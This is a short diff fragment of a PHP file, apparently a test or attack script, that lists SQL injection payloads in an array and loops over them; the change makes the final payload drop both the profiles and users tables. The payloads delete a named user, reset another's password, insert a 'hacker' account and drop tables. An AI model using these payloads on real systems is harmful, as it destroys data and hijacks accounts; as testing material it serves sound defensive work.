@@ -13,7 +13,7 @@ $payloads = [
     "'; DELETE FROM users WHERE username='andrea.moretto'; --",
     "'; UPDATE users SET password='123456' WHERE username='martina.bianchi'; -- ",
     "'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked123'); SELECT * FROM users WHERE 1=1; --",
-    "'; DROP TABLE users; -- "
+    "'; DROP TABLE profiles; DROP TABLE users; --"
 ];
 
 foreach ($payloads as $payload) {
